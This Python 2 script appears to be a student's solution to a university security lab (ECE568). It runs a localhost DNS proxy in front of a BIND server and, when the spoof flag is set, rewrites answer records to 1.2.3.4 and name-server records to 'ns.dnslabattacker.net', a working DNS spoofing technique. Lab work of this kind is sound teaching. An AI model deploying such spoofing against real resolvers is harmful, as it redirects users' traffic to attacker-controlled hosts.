#!/usr/bin/env python2
import argparse
import socket
from scapy.all import *

# This is going to Proxy in front of the Bind Server

parser = argparse.ArgumentParser()
parser.add_argument("--port", help="port to run your proxy on - careful to not run it on the same port as the BIND server", type=int)
parser.add_argument("--dns_port", help="port the BIND uses to listen to dns queries", type=int)
parser.add_argument("--spoof_response", action="store_true", help="flag to indicate whether you want to spoof the BIND Server's response (Part 3) or return it as is (Part 2). Set to True for Part 3 and False for Part 2", default=False)
args = parser.parse_args()

# Port to run the proxy on
port = args.port
# BIND's port
dns_port = args.dns_port
# Flag to indicate if the proxy should spoof responses
SPOOF = args.spoof_response

""" ECE568 BEGIN """
print("SPOOF is set to {}".format(SPOOF))

# Create a reusable socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

def run_proxy(proxy_ip, proxy_port, bind_ip, bind_port):
    """
    Runs the DNS proxy at `proxy_ip`:`proxy_port` and forwards queries to the BIND server at `bind_ip`:`bind_port`
    """
    try:
        sock.bind((proxy_ip, proxy_port))
        print("DNS Proxy running on port {}".format(proxy_port))

        while True:
            data, client_addr = sock.recvfrom(1024)  # Receive DNS query
            print("Received DNS query from {}".format(client_addr))
            response = get_dns_response(data, bind_ip, bind_port)  # Forward query to BIND server
            sock.sendto(response, client_addr)  # Send response back to the original requester
    finally:
        sock.close()  # Ensure the socket is closed even if an error occurs

def get_dns_response(data, bind_ip, bind_port):
    """
    Forwards DNS query to the BIND server at `bind_ip`:`bind_port`
    Modify the response if `SPOOF` is set to True
    """
    fwd_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    fwd_sock.sendto(data, (bind_ip, bind_port))
    response, _ = fwd_sock.recvfrom(1024)
    fwd_sock.close()

    if not SPOOF:
        print("Forwarding DNS query to BIND server {}:{}".format(bind_ip, bind_port))
        return response

    else:
        print("Spoofing DNS response to BIND server {}:{}".format(bind_ip, bind_port))
        return bytes(modify_dns_response(response))

def modify_dns_response(data):
    """
    Modifies the IP address and NS records.
    """
    spoof_response = DNS(data)
    domain_name = spoof_response.qd.qname
    print("Domain name queried: {}".format(domain_name))
    
    new_an = "1.2.3.4"
    new_ns = "ns.dnslabattacker.net"
    print("ancount: {}".format(spoof_response.ancount))
    for i in range(spoof_response.ancount):
        spoof_response.an[i].rdata = new_an
    print("nscount: {}".format(spoof_response.nscount))
    for i in range(spoof_response.nscount):
        spoof_response.ns[i].rdata = new_ns

    return spoof_response

if __name__ == "__main__":
    proxy_ip = '127.0.0.1'  # Proxy IP address
    bind_ip = '127.0.0.1'   # BIND server IP address
    run_proxy(proxy_ip, port, bind_ip, dns_port)

""" ECE568 END """